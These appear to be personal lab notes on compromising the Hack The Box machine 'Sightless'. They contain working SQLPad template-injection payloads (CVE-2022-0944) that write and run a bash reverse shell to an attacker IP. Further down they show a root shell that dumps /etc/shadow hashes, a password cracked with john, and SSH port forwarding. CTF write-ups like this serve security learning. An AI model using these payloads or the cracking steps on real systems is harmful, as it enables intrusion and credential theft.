@@ -1,0 +1,138 @@
+
+
+on the webpage we find sqlpad.sightless.htb
+
+About SQLPad
+
+Version: 6.10.0
+
+CVE-2022-0944
+Template injection in connection test endpoint leads to RCE in GitHub repository sqlpad/sqlpad prior to 6.10.1.
+
+https://huntr.com/bounties/46630727-d923-4444-a421-537ecd63e7fb
+
+
+
+{{ process.mainModule.require('child_process').exec('echo "#!/bin/bash\nbash -i >& /dev/tcp/10.10.14.37/443 0>&1" > /tmp/exploit.sh') }}
+
+
+{{ process.mainModule.require('child_process').exec('/bin/bash /tmp/exploit.sh') }}
+
+
+┌──(root㉿kali)-[/home/kali]
+└─# nc -lvnp 443 
+listening on [any] 443 ...
+connect to [10.10.14.37] from (UNKNOWN) [10.10.11.32] 41544
+bash: cannot set terminal process group (1): Inappropriate ioctl for device
+bash: no job control in this shell
+root@c184118df0a6:/var/lib/sqlpad# 
+
+script breakout
+
+root@c184118df0a6:/var/lib/sqlpad# id
+uid=0(root) gid=0(root) groups=0(root)
+root@c184118df0a6:/var/lib/sqlpad# la -lsa
+bash: la: command not found
+root@c184118df0a6:/var/lib/sqlpad# ls -lsa
+total 200
+  4 drwxr-xr-x 4 root root   4096 Sep 19 04:18 .
+  4 drwxr-xr-x 1 root root   4096 Mar 12  2022 ..
+  4 drwxr-xr-x 2 root root   4096 Aug  9  2024 cache
+  4 drwxr-xr-x 2 root root   4096 Aug  9  2024 sessions
+184 -rw-r--r-- 1 root root 188416 Sep 19 04:30 sqlpad.sqlite
+root@c184118df0a6:/var/lib/sqlpad# cd ..
+root@c184118df0a6:/var/lib# ls
+apt  dpkg  misc  pam  sqlpad  systemd
+root@c184118df0a6:/var/lib# cd ..
+root@c184118df0a6:/var# ls
+backups  cache	lib  local  lock  log  mail  opt  run  spool  tmp
+root@c184118df0a6:/var# cd ..
+root@c184118df0a6:/# ls
+bin   dev		 etc   lib    media  opt   root  sbin  sys  usr
+boot  docker-entrypoint  home  lib64  mnt    proc  run	 srv   tmp  var
+root@c184118df0a6:/# cat /etc/shadow
+root:$6$jn8fwk6LVJ9IYw30$qwtrfWTITUro8fEJbReUc7nXyx2wwJsnYdZYm9nMQDHP8SYm33uisO9gZ20LGaepC3ch6Bb2z/lEpBM90Ra4b.:19858:0:99999:7:::
+daemon:*:19051:0:99999:7:::
+...
+_apt:*:19051:0:99999:7:::
+node:!:19053:0:99999:7:::
+michael:$6$mG3Cp2VPGY.FDE8u$KVWVIHzqTzhOSYkzJIpFc2EsgmqvPa.q2Z9bLUU6tlBWaEwuxCDEP9UFHIXNUcF2rBnsaFYuJa6DUh/pL2IJD/:19860:0:99999:7:::
+root@c184118df0a6:/# 
+
+
+
+                                                                                                                     
+┌──(root㉿kali)-[/home/kali]
+└─# echo 'michael:$6$mG3Cp2VPGY.FDE8u$KVWVIHzqTzhOSYkzJIpFc2EsgmqvPa.q2Z9bLUU6tlBWaEwuxCDEP9UFHIXNUcF2rBnsaFYuJa6DUh/pL2IJD/' > hash
+                                                                                                                     
+┌──(root㉿kali)-[/home/kali]
+└─# john --wordlist=/usr/share/wordlists/rockyou.txt hash
+Warning: detected hash type "sha512crypt", but the string is also recognized as "HMAC-SHA256"
+Use the "--format=HMAC-SHA256" option to force loading these as that type instead
+Using default input encoding: UTF-8
+Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 128/128 SSE2 2x])
+Cost 1 (iteration count) is 5000 for all loaded hashes
+Will run 3 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+insaneclownposse (michael)     
+1g 0:00:00:31 DONE (2025-09-19 00:38) 0.03215g/s 1882p/s 1882c/s 1882C/s kruimel..haziel
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed. 
+                                                                                                                     
+┌──(root㉿kali)-[/home/kali]
+└─# ssh michael@10.10.11.32                     
+The authenticity of host '10.10.11.32 (10.10.11.32)' can't be established.
+ED25519 key fingerprint is SHA256:L+MjNuOUpEDeXYX6Ucy5RCzbINIjBx2qhJQKjYrExig.
+This key is not known by any other names.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? insaneclownposse
+Please type 'yes', 'no' or the fingerprint: yes
+Warning: Permanently added '10.10.11.32' (ED25519) to the list of known hosts.
+michael@10.10.11.32's password: 
+Last login: Tue Sep  3 11:52:02 2024 from 10.10.14.23
+michael@sightless:~$ sudo -l
+[sudo] password for michael: 
+Sorry, user michael may not run sudo on sightless.
+michael@sightless:~$ netstat -lputn
+(Not all processes could be identified, non-owned process info
+ will not be shown, you would have to be root to see it all.)
+Active Internet connections (only servers)
+Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
+tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -                   
+tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
+tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
+tcp        0      0 127.0.0.1:8080          0.0.0.0:*               LISTEN      -                   
+tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -                   
+tcp        0      0 127.0.0.1:3000          0.0.0.0:*               LISTEN      -                   
+tcp        0      0 127.0.0.1:33565         0.0.0.0:*               LISTEN      -                   
+tcp        0      0 127.0.0.1:56117         0.0.0.0:*               LISTEN      -                   
+tcp        0      0 127.0.0.1:34971         0.0.0.0:*               LISTEN      -                   
+tcp        0      0 127.0.0.1:33060         0.0.0.0:*               LISTEN      -                   
+tcp6       0      0 :::21                   :::*                    LISTEN      -                   
+tcp6       0      0 :::22                   :::*                    LISTEN      -                   
+udp        0      0 127.0.0.53:53           0.0.0.0:*                           -                   
+udp        0      0 0.0.0.0:68              0.0.0.0:*                           -                   
+michael@sightless:~$ 
+
+
+
+at this point, we are supposed to ssh forward and visit the froxlor locally.
+However, I keep receiving Domain not configured. 
+I have to remove localhost from my /etc/hosts
+modify 127.0.0.1 to go to sightless.htb
+
+┌──(root㉿kali)-[/home/kali]
+└─# ssh -L 8080:127.0.0.1:8080 michael@sightless.htb
+michael@sightless.htb's password: 
+Last login: Fri Sep 19 05:56:44 2025 from 10.10.14.37
+michael@sightless:~$ 
+
+
+
+visit http://127.0.0.1:8080/
+
+https://github.com/advisories/GHSA-x525-54hf-xr53
+
+
+
+
+
